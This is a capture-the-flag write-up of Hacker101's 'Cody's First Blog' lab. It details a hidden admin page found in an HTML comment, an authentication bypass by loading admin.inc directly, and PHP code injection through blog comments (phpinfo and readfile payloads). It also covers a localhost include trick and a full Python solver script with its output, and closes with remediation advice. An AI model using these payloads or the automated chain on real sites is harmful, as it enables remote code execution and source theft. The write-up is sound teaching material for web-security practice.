---
description: >-
  Detailed walkthrough of Hacker101’s Cody’s First Blog challenge, including
  recon, hidden admin page discovery, PHP code injection through comments, admin
  authentication bypass, localhost include explo
---

# Cody’s First Blog - Hacker101 CTF Writeup

## Overview

This machine is called **Cody's First Blog**.

My instance URL was:

```
https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/
```

At first, the website looks like a very simple blog.

The homepage shows a welcome message and a first blog post. There is also a comment form where visitors can submit comments.

The important part is that the page gives us a few hints about how the application is built.

One line from the homepage says something like:

```
PHP doesn't need a template language because it is a template language.
```

That is a big hint.

It suggests that the application may be including or rendering PHP files directly.

The final chain was:

```
1. Find hidden admin page.
2. Submit PHP code as a blog comment.
3. Trigger PHP execution from the comment.
4. Bypass admin authentication by directly including admin.inc.
5. Approve malicious comments.
6. Use a localhost page include trick.
7. Read source / backend-rendered content.
8. Get all three flags.
```

The bugs used were:

```
PHP code injection
Local file / page inclusion
Broken admin access control
Unsafe comment approval/rendering
```

***

## Initial Recon

I started by visiting the homepage:

```bash
curl -i https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/
```

The response showed a simple HTML page:

```html
<!doctype html>
<html>
	<head>
		<title>Home -- Cody's First Blog</title>
	</head>
	<body>
		<h1>Home</h1>
		<p>Welcome to my blog! I'm excited to share my thoughts with the world.</p>

		<h2>September 1, 2018 -- First</h2>
		<p>First post! I built this blog engine around one basic concept:
		PHP doesn't need a template language because it <i>is</i> a template language.</p>
	</body>
</html>
```

The phrase about PHP being a template language is very important.

It tells us that the application may be doing something dangerous like:

```php
include($_GET["page"] . ".php");
```

or:

```php
include($_GET["page"]);
```

So I started looking for parameters related to pages/includes.

***

## Finding the Hidden Admin Page

While checking the homepage HTML, I found a hidden admin link.

It looked like this:

```html
<!-- <a href="?page=admin.auth.inc">Admin login</a> -->
```

So the hidden admin login page was:

```
?page=admin.auth.inc
```

Full URL:

```
https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/?page=admin.auth.inc
```

This tells us two important things:

```
1. The app uses a page parameter.
2. The app is including files like admin.auth.inc.
```

That means the `page` parameter is probably used to load/include files.

So the URL:

```
?page=admin.auth.inc
```

probably makes the application include:

```
admin.auth.inc
```

The `.auth` part looked like an authentication wrapper.

That gave me an idea:

```
If admin.auth.inc is the authenticated admin page,
maybe admin.inc is the real admin page.
```

So I tried removing `.auth`.

***

## FLAG2 — Admin Authentication Bypass

The hidden admin login page was:

```
?page=admin.auth.inc
```

I tried accessing:

```
?page=admin.inc
```

Full URL:

```
https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/?page=admin.inc
```

This worked.

The application loaded the admin page without requiring authentication.

That gave me a flag:

```
^FLAG^8c69200ada4a3fb2d25ab3b7d69b403b13609d4e8de2130df498fafacf3718c7$FLAG$
```

The problem was broken access control.

The app protected:

```
admin.auth.inc
```

but the real admin include:

```
admin.inc
```

was directly accessible.

So just removing `.auth` bypassed the login.

***

## Comment Form Testing

The homepage has a comment form.

Since the blog post mentioned PHP templates, I tested whether PHP code inside comments would be interpreted.

I submitted this comment:

```php
<?php phpinfo(); ?>
```

The idea was simple:

```
If comments are rendered as PHP code instead of plain text,
phpinfo() will execute.
```

When the payload was submitted, the response gave me a flag:

```
^FLAG^607cbdd1d84c83f8d681b41b65ca8e9f28aab41846754832034e7f7b180488ba$FLAG$
```

So the application was vulnerable to PHP code injection through comments.

This means the app was treating user comments as template/PHP content instead of escaping them safely.

A safe application should render comments as text.

But this app allowed PHP tags like:

```php
<?php phpinfo(); ?>
```

to execute or be interpreted in the page rendering flow.

***

## Why PHP in Comments Worked

Normally, user comments should be stored and displayed safely like this:

```html
&lt;?php phpinfo(); ?&gt;
```

That would show the text without executing it.

But this app was built around PHP includes/templates.

So a submitted comment could become part of a PHP-rendered page.

The dangerous idea is something like this:

```php
include("comments.inc");
```

If `comments.inc` contains user-controlled text and PHP tags are not escaped, then this user-controlled text can become executable PHP.

That is why this payload was dangerous:

```php
<?php phpinfo(); ?>
```

It was not just displayed as text.

It became executable PHP in the application's rendering context.

***

## Approving Comments Through Admin

The comment was submitted, but comments need to be approved.

The admin page listed pending comments and had approve links.

After bypassing admin authentication with:

```
?page=admin.inc
```

I saw links like:

```
?page=admin.inc&approve=2
?page=admin.inc&approve=3
```

Approving a comment means the application will render it publicly.

So the attack flow became:

```
1. Submit malicious PHP comment.
2. Visit ?page=admin.inc.
3. Click approve link.
4. Reload page that renders approved comments.
5. PHP payload executes.
```

The solver automated this by scraping all links containing `approve` and visiting them.

***

## FLAG3 — Reading Source with `readfile`

After proving PHP execution with:

```php
<?php phpinfo(); ?>
```

I submitted a more useful PHP payload:

```php
<?php echo readfile("index.php")?>
```

This payload attempts to read the application source file:

```
index.php
```

The reason for choosing `index.php` is that PHP applications commonly use `index.php` as the front controller or main entrypoint.

So the payload was:

```php
<?php echo readfile("index.php")?>
```

After submitting it, I went back to the admin page:

```
https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/?page=admin.inc
```

Then I approved the comment.

The approve URLs looked like:

```
?page=admin.inc&approve=2
?page=admin.inc&approve=3
```

After approving the comment, I needed to trigger the right rendering path.

***

## The `localhost` Include Trick

The homepage text said:

```
This server can't talk to the outside world
```

That sentence is another hint.

It means remote URLs may be blocked, but the server can still talk to itself through localhost.

The useful URL was:

```
?page=http://localhost/index
```

Full URL:

```
https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/?page=http://localhost/index
```

This makes the server include or fetch:

```
http://localhost/index
```

Since it is a request from the server to itself, it can access the local blog page.

The important difference is that this path causes the approved PHP comment to be rendered/executed in the backend context.

So after approving the comment containing:

```php
<?php echo readfile("index.php")?>
```

I visited:

```
https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/?page=http://localhost/index
```

This leaked the final flag:

```
^FLAG^7e40b4d20cb2783f5f0ccd8c39704a9f03a26c6b7324bf3b97e52b5d5d167bf7$FLAG$
```

The same response also contained the earlier PHP comment flag again:

```
^FLAG^607cbdd1d84c83f8d681b41b65ca8e9f28aab41846754832034e7f7b180488ba$FLAG$
```

***

## Full Solver Script

This is the full solver script I used.

It automates the whole process:

```
1. Load homepage.
2. Find hidden admin link.
3. Submit PHP comment payload.
4. Access admin.auth.inc.
5. Bypass auth with admin.inc.
6. Submit readfile payload.
7. Approve pending comments.
8. Visit page=http://localhost/index.
9. Extract all flags.
```

```python
#!/usr/bin/env python3
import argparse
import re
from urllib.parse import urljoin

import requests


DEFAULT_URL = "https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/"


def normalize_url(url):
    url = url.strip()

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    if not url.endswith("/"):
        url += "/"

    return url


def extract_flags(text):
    flags = re.findall(r"\^FLAG\^[A-Za-z0-9]+\$FLAG\$", text)
    return list(dict.fromkeys(flags))


def show_flags(label, text):
    flags = extract_flags(text)

    print(f"\n[{label}]")

    if flags:
        for flag in flags:
            print(f"[+] {flag}")
    else:
        print("[-] No flags found")

    return flags


def get_home(session, base_url):
    print("[+] Loading homepage")

    r = session.get(base_url, timeout=20)

    print(f"[+] Status: {r.status_code}")
    print(r.text[:500])

    return r.text


def find_hidden_admin_link(html):
    """
    The homepage source contains a hidden admin link like:

        <!-- <a href="?page=admin.auth.inc">Admin login</a> -->
    """
    links = re.findall(r'href=["\']([^"\']+)["\']', html)

    for link in links:
        if "admin" in link:
            return link

    m = re.search(r"admin\.auth\.inc", html)

    if m:
        return "?page=admin.auth.inc"

    return None


def submit_comment(session, base_url, payload):
    print(f"\n[+] Submitting comment payload:")
    print(payload)

    data_variants = [
        {"body": payload},
        {"comment": payload},
        {"text": payload},
    ]

    last_response = ""

    for data in data_variants:
        r = session.post(base_url, data=data, timeout=20)
        last_response = r.text

        print(f"[+] Tried fields {list(data.keys())}, status {r.status_code}")

        flags = extract_flags(r.text)

        if flags or "awaiting approval" in r.text.lower() or "submitted" in r.text.lower():
            print("[+] Comment submission seems accepted")
            return r.text

    return last_response


def access_admin(session, base_url):
    print("\n[+] Accessing admin login page")

    auth_url = base_url + "?page=admin.auth.inc"

    r1 = session.get(auth_url, timeout=20)

    print(f"[+] admin.auth.inc status: {r1.status_code}")

    print("[+] Trying auth bypass by removing '.auth'")

    admin_url = base_url + "?page=admin.inc"

    r2 = session.get(admin_url, timeout=20)

    print(f"[+] admin.inc status: {r2.status_code}")

    return r1.text + "\n" + r2.text, r2.text


def approve_all_comments(session, base_url, admin_html):
    print("\n[+] Looking for approve links in admin page")

    hrefs = re.findall(r'href=["\']([^"\']+)["\']', admin_html)

    approve_links = []

    for href in hrefs:
        if "approve" in href.lower():
            approve_links.append(href)

    approve_links = list(dict.fromkeys(approve_links))

    if not approve_links:
        print("[-] No approve links found automatically")
        print("[+] Admin HTML preview:")
        print(admin_html[:1500])
        return ""

    combined = ""

    for link in approve_links:
        approve_url = urljoin(base_url, link)

        print(f"[+] Visiting approve link: {approve_url}")

        r = session.get(approve_url, timeout=20)

        print(f"[+] Status: {r.status_code}")

        combined += "\n" + r.text

    return combined


def read_backend_index(session, base_url):
    """
    The useful local include URL is:

        ?page=http://localhost/index

    This makes the server load its own local index page.
    """
    print("\n[+] Reading backend page through page=http://localhost/index")

    target = base_url + "?page=http://localhost/index"

    r = session.get(target, timeout=20)

    print(f"[+] Status: {r.status_code}")

    return r.text


def main():
    parser = argparse.ArgumentParser(description="Hacker101 Cody's First Blog solver")

    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help="Challenge instance URL",
    )

    args = parser.parse_args()

    base_url = normalize_url(args.url)

    session = requests.Session()

    print(f"[+] Target: {base_url}")

    all_flags = []

    home = get_home(session, base_url)
    all_flags.extend(show_flags("Homepage flags", home))

    hidden = find_hidden_admin_link(home)

    if hidden:
        print(f"\n[+] Hidden admin link found: {hidden}")
    else:
        print("\n[-] Hidden admin link not found automatically")

    phpinfo_payload = "<?php phpinfo(); ?>"

    resp = submit_comment(session, base_url, phpinfo_payload)
    all_flags.extend(show_flags("PHP comment injection", resp))

    admin_combined, admin_html = access_admin(session, base_url)
    all_flags.extend(show_flags("Admin page / auth bypass", admin_combined))

    readfile_payload = '<?php echo readfile("index.php")?>'

    resp2 = submit_comment(session, base_url, readfile_payload)
    all_flags.extend(show_flags("Readfile comment submitted", resp2))

    admin_combined2, admin_html2 = access_admin(session, base_url)
    all_flags.extend(show_flags("Admin after readfile payload", admin_combined2))

    approved = approve_all_comments(session, base_url, admin_html2)
    all_flags.extend(show_flags("Approve comments response", approved))

    backend = read_backend_index(session, base_url)
    all_flags.extend(show_flags("Backend localhost index", backend))

    all_flags = list(dict.fromkeys(all_flags))

    print("\n==============================")
    print("[+] ALL FLAGS FOUND")
    print("==============================")

    if all_flags:
        for flag in all_flags:
            print(flag)
    else:
        print("[-] No flags found yet")
        print("[!] If approve links were not detected, open:")
        print(f"    {base_url}?page=admin.inc")
        print("[!] Then click approve manually and visit:")
        print(f"    {base_url}?page=http://localhost/index")


if __name__ == "__main__":
    main()
```

***

## Running the Solver

I saved the script as:

```
codys_solver.py
```

Then I ran:

```bash
python3 codys_solver.py --url https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/
```

The output was:

```
[+] Target: https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/
[+] Loading homepage
[+] Status: 200
<!doctype html>
<html>
	<head>
		<title>Home -- Cody's First Blog</title>
	</head>
	<body>
		<h1>Home</h1>
		<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>

	<h2>September 1, 2018 -- First</h2>
	<p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world

[Homepage flags]
[-] No flags found

[+] Hidden admin link found: ?page=admin.auth.inc

[+] Submitting comment payload:
<?php phpinfo(); ?>
[+] Tried fields ['body'], status 200
[+] Comment submission seems accepted

[PHP comment injection]
[+] ^FLAG^607cbdd1d84c83f8d681b41b65ca8e9f28aab41846754832034e7f7b180488ba$FLAG$

[+] Accessing admin login page
[+] admin.auth.inc status: 200
[+] Trying auth bypass by removing '.auth'
[+] admin.inc status: 200

[Admin page / auth bypass]
[+] ^FLAG^8c69200ada4a3fb2d25ab3b7d69b403b13609d4e8de2130df498fafacf3718c7$FLAG$

[+] Submitting comment payload:
<?php echo readfile("index.php")?>
[+] Tried fields ['body'], status 200
[+] Comment submission seems accepted

[Readfile comment submitted]
[+] ^FLAG^607cbdd1d84c83f8d681b41b65ca8e9f28aab41846754832034e7f7b180488ba$FLAG$

[+] Accessing admin login page
[+] admin.auth.inc status: 200
[+] Trying auth bypass by removing '.auth'
[+] admin.inc status: 200

[Admin after readfile payload]
[+] ^FLAG^8c69200ada4a3fb2d25ab3b7d69b403b13609d4e8de2130df498fafacf3718c7$FLAG$

[+] Looking for approve links in admin page
[+] Visiting approve link: https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/?page=admin.inc&approve=2
[+] Status: 200
[+] Visiting approve link: https://f20596576c78ab261a1cdf69e1649117.ctf.hacker101.com/?page=admin.inc&approve=3
[+] Status: 200

[Approve comments response]
[+] ^FLAG^8c69200ada4a3fb2d25ab3b7d69b403b13609d4e8de2130df498fafacf3718c7$FLAG$

[+] Reading backend page through page=http://localhost/index
[+] Status: 200

[Backend localhost index]
[+] ^FLAG^7e40b4d20cb2783f5f0ccd8c39704a9f03a26c6b7324bf3b97e52b5d5d167bf7$FLAG$
[+] ^FLAG^607cbdd1d84c83f8d681b41b65ca8e9f28aab41846754832034e7f7b180488ba$FLAG$

==============================
[+] ALL FLAGS FOUND
==============================
^FLAG^607cbdd1d84c83f8d681b41b65ca8e9f28aab41846754832034e7f7b180488ba$FLAG$
^FLAG^8c69200ada4a3fb2d25ab3b7d69b403b13609d4e8de2130df498fafacf3718c7$FLAG$
^FLAG^7e40b4d20cb2783f5f0ccd8c39704a9f03a26c6b7324bf3b97e52b5d5d167bf7$FLAG$
```

***

## Final Flags

```
^FLAG^607cbdd1d84c83f8d681b41b65ca8e9f28aab41846754832034e7f7b180488ba$FLAG$
^FLAG^8c69200ada4a3fb2d25ab3b7d69b403b13609d4e8de2130df498fafacf3718c7$FLAG$
^FLAG^7e40b4d20cb2783f5f0ccd8c39704a9f03a26c6b7324bf3b97e52b5d5d167bf7$FLAG$
```

***

## Why This Worked

There were multiple issues chained together.

### 1. Unsafe page include

The app accepted a page parameter:

```
?page=admin.auth.inc
```

and loaded files based on it.

That exposed internal include files.

### 2. Hidden admin page was not enough

The admin link was hidden in an HTML comment:

```html
<!-- <a href="?page=admin.auth.inc">Admin login</a> -->
```

But hidden links are not security.

Anyone can read HTML comments.

### 3. Broken access control

The app protected:

```
admin.auth.inc
```

but allowed direct access to:

```
admin.inc
```

So removing `.auth` bypassed the login.

### 4. PHP code injection in comments

The app allowed this as a comment:

```php
<?php phpinfo(); ?>
```

and it executed in the application rendering flow.

User comments should be escaped and rendered as plain text, not treated as PHP code.

### 5. Localhost include behavior

The app could not talk to the outside world, but it could talk to itself.

This URL worked:

```
?page=http://localhost/index
```

That made the server render its own local index page and triggered the approved PHP comment payload.

***

## Fixes

The application should not include arbitrary files based on user input.

Bad idea:

```php
include($_GET["page"]);
```

Better approach:

```php
$pages = [
    "home" => "pages/home.php",
    "about" => "pages/about.php",
];

$page = $_GET["page"] ?? "home";

if (!array_key_exists($page, $pages)) {
    http_response_code(404);
    exit;
}

include($pages[$page]);
```

Admin pages should enforce authorization inside the admin code itself.

Bad:

```
admin.auth.inc protects admin.inc only if users enter through admin.auth.inc
```

Good:

```php
if (!$user_is_admin) {
    http_response_code(403);
    exit;
}
```

Comments should be escaped before rendering.

Bad:

```php
echo $comment;
```

Good:

```php
echo htmlspecialchars($comment, ENT_QUOTES, "UTF-8");
```

Remote URL includes should be disabled.

In PHP config:

```ini
allow_url_include = Off
allow_url_fopen = Off
```

***

## Summary

The whole solve path was:

```
1. Open homepage.
2. Notice PHP/template hint.
3. Find hidden admin.auth.inc link in HTML.
4. Submit <?php phpinfo(); ?> as a comment.
5. Get first flag from PHP comment injection.
6. Visit ?page=admin.auth.inc.
7. Bypass auth with ?page=admin.inc.
8. Get second flag from admin access.
9. Submit <?php echo readfile("index.php")?> as a comment.
10. Approve comments using admin approve links.
11. Visit ?page=http://localhost/index.
12. Get final flag from backend-rendered source/comment execution.
```

The key payloads were:

```php
<?php phpinfo(); ?>
```

```
?page=admin.inc
```

```php
<?php echo readfile("index.php")?>
```

```
?page=http://localhost/index
```

This was a very fast machine once automated because every step was directly reachable through simple HTTP requests.
